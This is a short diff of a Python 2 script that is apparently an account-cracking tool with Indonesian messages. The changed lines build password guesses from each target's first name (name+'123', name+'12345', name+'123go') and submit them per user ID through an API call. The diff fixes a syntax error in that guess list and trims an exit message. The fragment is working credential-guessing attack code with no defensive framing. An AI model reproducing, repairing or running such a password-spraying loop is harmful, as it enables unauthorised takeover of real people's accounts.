@@ -278,7 +278,7 @@ class ngentod:
                         if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                             pwx = [name, _i_[0]+"123", _i_[0]+"12345", _i_[0]+"123go"]
                         else:
-                            pwx = [name, _i_[0]+"123", _i_[0]+"12345", _i_[0]"123go"]
+                            pwx = [name, _i_[0]+"123", _i_[0]+"12345", _i_[0]+"123go"]
                         log.submit(self.b_api, uid, pwx)
                     except: pass
             os.remove(self.apk);exit()
@@ -711,7 +711,7 @@ def hasill(c):
 				print (cepek)
 				exit(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
 			except IOError,KeyError:
-				exit (M+"\n [!] tidak ada hasil awokawokawok")
+				exit (M+"\n [!] tidak ada hasil")
 		else:
 			exit()
 def igg():
